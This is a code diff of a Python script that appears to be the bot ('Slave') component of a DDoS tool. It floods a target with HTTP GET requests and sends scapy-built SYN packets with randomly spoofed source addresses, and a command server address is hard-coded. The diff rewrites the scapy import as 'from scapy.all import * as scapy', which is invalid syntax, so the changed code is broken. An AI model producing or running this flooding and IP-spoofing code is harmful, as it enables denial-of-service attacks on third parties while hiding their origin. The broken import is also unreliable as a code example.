@@ -2,8 +2,7 @@
 import time, os, sys, string, ntplib
 from socket import *  #importing the socket library for network connections
 from time import ctime
-from scapy.all import *
-conf.verb=0
+from scapy.all import * as scapy
 
 ##Setting up variables
 SERVER_HOST = '10.1.1.50'
@@ -51,8 +50,8 @@ class Slave():
             self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
             #IP Spoof
             src = "10.1.1.{}".format(random.randint(0,255))
-            spoofed_SYN =IP(dst=host,src=src)/TCP(dport=8080,sport=5000,flags='S')
-            send(spoofed_SYN)
+            spoofed_SYN =scapy.IP(dst=host,src=src)/TCP(dport=8080,sport=5000,flags='S')
+            scapy.send(spoofed_SYN)
         except error, msg:
             self.num_connections = self.num_connections+1
             print("|[Connection Failed] | %d", self.num_connections )
